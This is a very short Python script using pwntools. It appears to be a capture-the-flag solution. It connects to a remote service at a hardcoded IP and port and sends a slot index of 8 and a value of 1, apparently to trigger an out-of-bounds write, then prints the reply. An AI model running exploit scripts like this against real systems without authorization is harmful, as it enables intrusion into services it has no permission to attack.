from pwn import *

p = remote("134.112.58.12",10009)

p.sendlineafter(b"slot: ", b"8")
p.sendlineafter(b"value: ", b"1")
print(p.recvall(timeout=2).decode(errors="replace"))